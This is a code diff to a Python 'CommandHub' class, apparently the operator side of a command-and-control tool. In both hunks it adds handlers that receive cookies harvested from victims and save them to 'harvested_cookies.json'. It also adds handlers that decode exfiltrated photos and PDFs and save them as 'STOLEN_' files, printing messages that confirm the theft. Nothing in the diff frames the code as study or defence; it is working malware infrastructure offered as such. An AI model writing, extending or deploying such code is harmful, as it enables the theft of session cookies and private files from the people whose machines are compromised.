@@ -415,9 +415,22 @@ class CommandHub:
                                 elif msg == 'PING':
                                     last_heartbeat = time.time()
                                 else:
-                                    with self.output_lock:
-                                        print(f"\n[?] Message from {alias}: {msg}")
-                                        print("hub> ", end="", flush=True)
+                                    # catch the JSON cookies and save them properly
+                                    if "COOKIE_JSON|" in msg:
+                                        _, json_data = msg.split("|", 1)
+                                        with open("harvested_cookies.json", "w") as f:
+                                            f.write(json_data)
+                                        print("[+] JSON Cookies Captured and Saved.")
+                                    # catch and reconstruct the photo/pdf
+                                    elif "FILE_STREAM|" in msg:
+                                        _, filename, encoded_data = msg.split("|", 2)
+                                        with open(f"STOLEN_{filename}", "wb") as f:
+                                            f.write(base64.b64decode(encoded_data))
+                                        print(f"[+] File {filename} successfully exfiltrated.")
+                                    else:
+                                        with self.output_lock:
+                                            print(f"\n[?] Message from {alias}: {msg}")
+                                            print("hub> ", end="", flush=True)
                             continue
 
                         # If the buffer grows too large without a newline, print and reset it.
@@ -497,6 +510,18 @@ class CommandHub:
                     self._handle_status_report(msg[7:], client_id)
                 elif msg == "PING_OK":
                     continue
+                # catch the JSON cookies and save them properly
+                elif "COOKIE_JSON|" in msg:
+                    _, json_data = msg.split("|", 1)
+                    with open("harvested_cookies.json", "w") as f:
+                        f.write(json_data)
+                    print("[+] JSON Cookies Captured and Saved.")
+                # catch and reconstruct the photo/pdf
+                elif "FILE_STREAM|" in msg:
+                    _, filename, encoded_data = msg.split("|", 2)
+                    with open(f"STOLEN_{filename}", "wb") as f:
+                        f.write(base64.b64decode(encoded_data))
+                    print(f"[+] File {filename} successfully exfiltrated.")
                 # To catch the JSON cookies
                 elif "COOKIES_DATA" in msg:
                     _, size, content = msg.split("|", 2)
